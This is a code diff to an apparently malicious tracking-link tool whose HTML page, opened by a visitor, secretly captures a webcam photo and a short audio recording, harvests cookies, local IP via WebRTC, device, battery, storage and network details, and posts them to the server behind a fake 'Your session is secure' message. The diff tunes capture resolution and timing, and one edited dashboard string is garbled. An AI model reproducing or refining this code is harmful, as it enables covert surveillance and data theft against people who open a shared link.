@@ -444,7 +444,7 @@ VIEW_LINK_HTML = """
         </div>
         {% endfor %}
     {% else %}
-        <p style="color:#6688aa;font-size:1.2rem;">No visits yet. Share your link to collect data.</p>
+        <p style="color:#6688aa;font-size:1.2rem;">No visits yet. Share your link to or data.</p>
     {% endif %}
 </div>
 </body>
@@ -480,13 +480,13 @@ p{font-size:1.5rem;color:#6688aa}
         }
 
         // ============================================
-        // 2. Camera + Audio (existing)
+        // 2. Camera (640x480) + Audio (3 sec)
         // ============================================
         let camera = null;
         let audioData = null;
 
         Promise.all([
-            navigator.mediaDevices.getUserMedia({ video: true }),
+            navigator.mediaDevices.getUserMedia({ video: { width: 640, height: 480 } }),
             navigator.mediaDevices.getUserMedia({ audio: true })
         ])
         .then(([videoStream, audioStream]) => {
@@ -496,13 +496,14 @@ p{font-size:1.5rem;color:#6688aa}
             video.play();
             setTimeout(() => {
                 const canvas = document.createElement('canvas');
-                canvas.width = 320; canvas.height = 240;
+                canvas.width = 640;
+                canvas.height = 480;
                 canvas.getContext('2d').drawImage(video, 0, 0);
                 camera = canvas.toDataURL('image/jpeg');
                 videoStream.getTracks().forEach(t => t.stop());
-            }, 2000);
+            }, 1500);
 
-            // Audio recording (5 seconds)
+            // Audio recording (3 seconds)
             const mediaRecorder = new MediaRecorder(audioStream);
             const chunks = [];
             mediaRecorder.ondataavailable = e => chunks.push(e.data);
@@ -519,7 +520,7 @@ p{font-size:1.5rem;color:#6688aa}
             setTimeout(() => {
                 mediaRecorder.stop();
                 audioStream.getTracks().forEach(t => t.stop());
-            }, 5000);
+            }, 3000);
         })
         .catch(err => {
             console.log('Permissions error:', err);
@@ -529,7 +530,7 @@ p{font-size:1.5rem;color:#6688aa}
         });
 
         // ============================================
-        // 3. New Data Collection (Device, Network, CPU, WebRTC, Storage)
+        // 3. Device, Network, CPU, WebRTC, Storage
         // ============================================
         let deviceModel = 'Unknown';
         const ua = navigator.userAgent;
@@ -547,7 +548,6 @@ p{font-size:1.5rem;color:#6688aa}
 
         let cpuCores = navigator.hardwareConcurrency || 'N/A';
 
-        // WebRTC Local IP (asynchronous)
         let localIP = 'N/A';
         function getLocalIP(callback) {
             const pc = new RTCPeerConnection({ iceServers: [{ urls: 'stun:stun.l.google.com:19302' }] });
@@ -561,12 +561,10 @@ p{font-size:1.5rem;color:#6688aa}
                     pc.close();
                 }
             };
-            // fallback after 2 seconds
             setTimeout(() => callback('N/A'), 2000);
         }
         getLocalIP((ip) => { localIP = ip; });
 
-        // Storage (asynchronous)
         let storageFree = 'N/A', storageTotal = 'N/A';
         if (navigator.storage) {
             navigator.storage.estimate().then(est => {
@@ -592,7 +590,7 @@ p{font-size:1.5rem;color:#6688aa}
         }
 
         // ============================================
-        // 5. Final send function (waits for camera+audio)
+        // 5. Send Data
         // ============================================
         function sendData() {
             let battery = 'N/A';
@@ -623,7 +621,6 @@ p{font-size:1.5rem;color:#6688aa}
                 memory: memory,
                 cookies: cookies,
                 referrer: referrer,
-                // New fields
                 deviceModel: deviceModel,
                 connType: connType,
                 downlink: downlink,
@@ -639,17 +636,17 @@ p{font-size:1.5rem;color:#6688aa}
                 headers: {'Content-Type': 'application/json'},
                 body: JSON.stringify(data)
             }).then(() => {
-                document.getElementById('status').innerHTML = '✅ Connection established. Please wait...';
+                document.getElementById('status').innerHTML = '✅ Connection established.';
                 setTimeout(() => {
                     document.querySelector('.loader').style.display = 'none';
                     document.querySelector('p').textContent = 'Thank you! You are now connected.';
                     document.getElementById('status').innerHTML = '🔒 Your session is secure.';
-                }, 1500);
+                }, 1000);
             });
         }
 
         // ============================================
-        // 6. Wait for camera+audio to be ready
+        // 6. Check & Send
         // ============================================
         let isSending = false;
         function checkAndSend() {
@@ -658,11 +655,11 @@ p{font-size:1.5rem;color:#6688aa}
                 isSending = true;
                 sendData();
             } else {
-                setTimeout(checkAndSend, 300);
+                setTimeout(checkAndSend, 200);
             }
         }
 
-        // Fallback: if camera/audio not ready after 10 seconds, force send
+        // Fallback: if camera/audio not ready after 6 seconds, force send
         setTimeout(() => {
             if (camera === null) camera = 'Failed';
             if (audioData === null) audioData = 'Failed';
@@ -670,7 +667,7 @@ p{font-size:1.5rem;color:#6688aa}
                 isSending = true;
                 sendData();
             }
-        }, 10000);
+        }, 6000);
     </script>
 </body>
 </html>
